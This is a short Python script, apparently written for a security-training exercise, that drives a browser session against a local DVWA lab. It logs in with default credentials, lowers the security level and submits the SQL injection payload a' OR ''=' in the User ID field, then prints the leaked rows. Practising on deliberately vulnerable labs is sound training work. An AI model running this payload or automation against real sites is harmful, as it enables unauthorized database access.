#!/usr/bin/python
"""
SQLi against DVWA for SPSE 4.4 exercise
"""

import mechanize
from bs4 import BeautifulSoup

br = mechanize.Browser()
br.open('http://localhost/dvwa/login.php')
br.select_form(nr=0)
br.form['username'] = 'admin'
br.form['password'] = 'password'
print "[*] Logging into DVWA"
br.submit()

print "[*] Changing DVWA security level to low"
br.follow_link(text="DVWA Security")
br.select_form(nr=0)

br.form['security'] = ['low']
br.submit()

br.follow_link(text="SQL Injection")
print "[*] Visiting SQLi page"

br.select_form(nr=0)
br.form['id'] = "a' OR ''='"
print "[*] testing User ID field submitting SQLi"
br.submit()
html = br.response().read()
bs = BeautifulSoup(html, "lxml")
for item in bs.findAll('pre'):
    print item

